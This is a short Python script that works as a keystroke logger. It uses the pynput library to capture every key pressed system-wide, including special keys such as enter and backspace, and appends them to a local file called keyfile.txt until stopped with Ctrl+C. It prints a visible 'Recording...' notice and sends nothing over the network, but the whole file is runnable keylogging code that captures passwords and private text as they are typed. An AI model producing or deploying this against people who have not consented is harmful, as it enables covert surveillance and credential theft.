from pynput import keyboard

# Define the file path
LOG_FILE = "keyfile.txt"

def on_press(key):
    try:
        # Attempt to get the alphanumeric character
        content = key.char
    except AttributeError:
        # Handle special keys (Space, Enter, etc.)
        if key == keyboard.Key.space:
            content = " "
        elif key == keyboard.Key.enter:
            content = "\n"
        elif key == keyboard.Key.backspace:
            content = "[BACKSPACE]"
        else:
            content = f" [{key}] "

    # Write to file
    with open(LOG_FILE, "a") as logKey:
        logKey.write(content)

if __name__ == "__main__":
    print("Recording... Press Ctrl+C in the terminal to stop.")
    # The 'with' statement here acts as a cleaner way to join the thread
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()